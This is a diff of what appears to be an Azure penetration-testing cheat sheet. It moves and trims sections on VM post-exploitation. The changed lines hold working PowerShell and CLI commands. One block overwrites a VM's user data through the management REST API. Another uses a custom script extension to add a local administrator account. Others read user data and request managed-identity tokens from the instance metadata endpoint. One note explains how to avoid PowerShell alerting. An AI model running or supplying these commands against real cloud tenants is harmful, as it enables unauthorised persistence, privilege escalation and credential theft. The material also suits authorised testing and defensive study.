@@ -213,48 +213,11 @@ Get-AzContext
 $userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text";[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
 ```
 
-#### Modify UserData
-```
-## It is also possible to modify user data with permissions "Microsoft.Compute/virtualMachines/write" on the target VM. Any automation or scheduled task reading commands from user data can be abused!
-
-$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("whoami"))
-$accessToken = (Get-AzAccessToken).Token
-$Url = "https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm?api-version=2021-07-01"
-$body = @(
-@{
-location = "Germany West Central"
-properties = @{
-userData = "$data"
-}
-}
-) | ConvertTo-Json -Depth 4
-
-$headers = @{
-Authorization = "Bearer $accessToken"
-}
-
-## Execute Rest API Call
-
-$Results = Invoke-RestMethod -Method Put -Uri $Url -Body $body -Headers $headers -ContentType 'application/json'
-```
-
-#### Check VM Extensions
-```
-Get-AzVMExtension -ResourceGroupName <RESEARCH GROUP NAME> -VMName <VM NAME>
-```
-
-#### Set VM Extensions
-- Required permissions `Microsoft.Compute/virtualMachines/extensions/write` and `Microsoft.Compute/virtualMachines/extensions/read`
-```
-Set-AzVMExtension -ResourceGroupName <RESEARCH GROUP NAME> -VMName <VM NAME> -ExtensionName ExecCmd -Location germanywestcentral -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users <NEW USER> <PASSWORD> /add /Y; net localgroup administrators <NEW USER> /add /Y"}'
-```
-
 #### Check if server has a managed identity
 - print environment variables and check for `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` variables exist.
 ```
 env
 ```
-
 
 #### Get access token
 Supported tokens = aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
@@ -1097,7 +1060,7 @@ Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
 Invoke-AzVMRunCommand -VMName <VM NAME> -ResourceGroupName <NAME> -CommandId 'RunPowerShellScript' -ScriptPath '<PATH TO .ps1 FILE>' -Verbose
 ```
 
-#### Contents of adduser.ps1
+#### Add user example script
 ```
 $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
 New-LocalUser -Name <USER> -Password $passwd
@@ -1112,23 +1075,9 @@ $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-
 Enter-PSSession $sess
 ```
 
-#### Execute privilege escalation or post exploitation
-
 ### Login on VM as managed idenity
 ```
 az login –identity
-```
-
-#### List permissions of current subscription
-- May have more permissions then the user
-```
-az role assignment list -–assignee ((az account list | ConvertFrom-Json).id)
-```
-
-#### If no AZ module can request token manually 
-- Then use Azure REST APIs with the token
-```
-Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
 ```
 
 ### Read password hashes from virtual machine
@@ -1171,6 +1120,42 @@ Invoke-AzVMRunCommand -ResourceGroupName <resource group name> -VMName <VM name>
 - Can be done from Azure portal
 - This may be a quick way to gain access and avoid PowerShell alerting
 - Be careful though as scripts/services may be using the credential
+
+#### Modify UserData
+- Any automation or scheduled task reading commands from user data can be abused!
+- Required Permissions `Microsoft.Compute/virtualMachines/write`
+```
+$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("whoami"))
+$accessToken = (Get-AzAccessToken).Token
+$Url = "https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm?api-version=2021-07-01"
+$body = @(
+@{
+location = "Germany West Central"
+properties = @{
+userData = "$data"
+}
+}
+) | ConvertTo-Json -Depth 4
+
+$headers = @{
+Authorization = "Bearer $accessToken"
+}
+
+## Execute Rest API Call
+
+$Results = Invoke-RestMethod -Method Put -Uri $Url -Body $body -Headers $headers -ContentType 'application/json'
+```
+
+#### Check VM Extensions
+```
+Get-AzVMExtension -ResourceGroupName <RESEARCH GROUP NAME> -VMName <VM NAME>
+```
+
+#### Set VM Extensions
+- Required permissions `Microsoft.Compute/virtualMachines/extensions/write` and `Microsoft.Compute/virtualMachines/extensions/read`
+```
+Set-AzVMExtension -ResourceGroupName <RESEARCH GROUP NAME> -VMName <VM NAME> -ExtensionName ExecCmd -Location germanywestcentral -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users <NEW USER> <PASSWORD> /add /Y; net localgroup administrators <NEW USER> /add /Y"}'
+```
 
 ## Deployments
 #### Check access to any resource group
